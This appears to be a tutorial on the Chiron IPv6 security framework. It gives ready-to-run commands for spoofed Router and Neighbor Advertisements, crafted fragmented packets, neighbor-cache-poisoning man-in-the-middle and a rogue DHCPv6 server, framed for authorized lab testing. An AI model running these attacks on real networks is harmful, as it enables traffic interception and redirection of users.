# How to Use Chiron Framework for IPv6 Attack Packet Construction

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Chiron, IPv6, Packet Construction, Security Testing, Scapy, Python

Description: A guide to using the Chiron IPv6 security assessment framework for constructing and sending custom IPv6 attack packets in authorized lab environments.

Chiron is a legacy Python 2.7-based IPv6 security assessment framework built on top of Scapy. It is organized as CLI tools backed by a common library for crafting arbitrary IPv6 header chains, fragmented or not, enabling security researchers to test IPv6 implementations for vulnerabilities. Like all security tools, it must only be used in authorized environments.

**Warning**: Only use in isolated lab environments with explicit authorization.

## Installing Chiron

```bash
# Chiron is distributed from its source repository. The official tutorial
# lists Python 2.7.x, Scapy, and python-netaddr as prerequisites.
git clone https://github.com/aatlasis/Chiron.git
cd Chiron/bin

# The bundled tools are run from the ./bin directory
python2 chiron_local_link.py --help
python2 chiron_scanner.py --help
python2 chiron_attacks.py --help
```

## Chiron vs Scapy Direct

Chiron builds on Scapy to provide IPv6-specific CLI workflows and a common packet-construction library:

| Feature | Chiron | Raw Scapy |
|---|---|---|
| IPv6 extension header chaining | CLI switches + common library | Manual construction |
| Local-link / NDP message generation | Built-in local-link module | Build from scratch |
| Attack workflows | Included attack module | Write custom code |
| IPv6 fragmentation controls | Built-in switches (`-nf`, `-lfE`, `-luE`) | Manual construction |

## Basic Packet Construction with Chiron

Chiron is primarily used through the CLI tools in its `bin/` directory. A couple of basic examples are:

```bash
# Multicast Router Advertisement
python2 chiron_local_link.py eth0 -ra -d ff02::1

# Router Solicitation
python2 chiron_local_link.py eth0 -rsol -d ff02::1
```

## Constructing Router Advertisement Packets

```bash
# Craft a Router Advertisement with a custom source MAC, lifetime, priority, prefix, and MTU
python2 chiron_local_link.py eth0 -ra -d ff02::1 \
  -m aa:bb:cc:dd:ee:ff \
  -rl 0 \
  -rp 3 \
  -pr 2001:db8:1:1:: \
  -mtu 3000
```

## Constructing Neighbor Advertisement (NDP Spoofing)

```bash
# Send an unsolicited Neighbor Advertisement to all nodes on the link
python2 chiron_local_link.py eth0 -neighadv -d ff02::1 \
  -ta 2001:db8:1:1::1 \
  -tm aa:bb:cc:dd:ee:ff \
  -r \
  -o
```

## Constructing Fragmented Packets

```bash
# Add a payload and split the generated packet into two fragments
python2 chiron_scanner.py eth0 -sn -d 2001:db8:1:1::2 \
  -l4_data "AAAAAAAA" \
  -nf 2
```

## Extension Header Chaining

```bash
# Add a Hop-by-Hop header and a Destination Options header
python2 chiron_scanner.py eth0 -sn -d 2001:db8:1:1::2 \
  -luE 0,60

# Add additional Destination Options headers to the fragmentable part
python2 chiron_scanner.py eth0 -sn -d 2001:db8:1:1::2 \
  -luE 0,60 \
  -lfE 2X60 \
  -l4_data "AAAAAAAA" \
  -nf 4
```

## Chiron's Attack Modules

Chiron's attack module provides built-in workflows such as neighbor-cache poisoning and a fake DHCPv6 server:

```bash
# Show available attack-module options
python2 chiron_attacks.py --help

# Man-in-the-middle via neighbor-cache poisoning
python2 chiron_attacks.py eth0 -s 2001:db8:1:1::1000 -mitm -d \
  2001:db8:1:1::10,2001:db8:1:1::20 -mitm_pcap myfile2.pcap

# Fake DHCPv6 server
python2 chiron_attacks.py eth0 -dhcpv6_server -pr 2001:db8:c001:cafe:: \
  -dhcpv6_DNS_Server 2001:db8:c001:cafe::10 \
  -dhcpv6_DNS_Domain_name my_IPv6_lab.com
```

## Capturing and Analyzing Results

```bash
# Capture traffic while running Chiron tests
sudo tcpdump -i eth0 -w chiron-test.pcap ip6

# Analyze in Wireshark
wireshark chiron-test.pcap
```

Chiron's Scapy-based CLI modules make it possible to experiment with IPv6 header chains, fragmentation, and local-link message generation in authorized lab environments, but it should be treated as a legacy Python 2.7 tool.
